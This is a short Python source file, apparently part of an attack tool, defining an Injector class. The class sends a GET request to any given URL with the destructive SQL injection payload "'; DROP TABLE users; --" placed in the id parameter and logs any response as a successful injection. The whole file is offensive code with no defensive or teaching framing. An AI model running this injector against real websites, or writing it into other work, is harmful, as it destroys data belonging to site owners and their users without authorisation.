import requests
from utils.http import HttpUtils

class Injector:
    def __init__(self, url, logger):
        self.url = url if url.startswith("http://") or url.startswith("https://") else "http://" + url
        self.logger = logger

    def inject(self):
        self.logger.log("Performing SQL Injection...")
        payload = "'; DROP TABLE users; --"
        full_url = f"{self.url}?id={payload}"
        self.logger.log(f"Injecting URL: {full_url}")
        response = HttpUtils.send_request(full_url)
        if response:
            self.logger.log(f"SQL Injection successful, response: {response.text[:100]}...")  # Log only first 100 characters for brevity
        else:
            self.logger.log("SQL Injection failed, no response received.")
